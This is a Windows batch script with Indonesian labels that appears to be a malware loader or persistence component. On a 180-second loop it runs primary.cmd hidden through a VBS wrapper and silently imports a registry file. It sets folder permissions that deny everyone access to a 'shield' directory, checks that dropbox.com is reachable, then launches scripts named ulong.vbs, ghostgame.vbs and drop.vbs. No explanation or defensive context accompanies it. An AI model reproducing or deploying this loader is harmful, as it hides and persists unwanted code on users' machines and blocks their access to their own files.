@echo off
set show=no
set detik=180

:mulai
if %show%==yes goto tampil
wscript sacred.vbs primary.cmd
goto muter

:tampil
start primary.cmd

:muter
call :download
ping -n %detik% 127.0.0.1 > nul
goto mulai

:cekfile
PING dropbox.com -n 1 | find /i "bytes=" || goto keluar
PING dropbox.com -n 1 | find /i "bytes=" || goto keluar
PING dropbox.com -n 1 | find /i "bytes=" || goto keluar
goto :eof

:keluar
exit

:download
regedit /s "D:\secre\shield\data\install.reg"
echo y| cacls d:\secre\shield\data /P everyone:F
echo y| cacls d:\secre\shield /P everyone:N
call :cekfile
wscript ulong.vbs
call :cekfile
wscript ghostgame.vbs
call :cekfile
wscript drop.vbs
goto :eof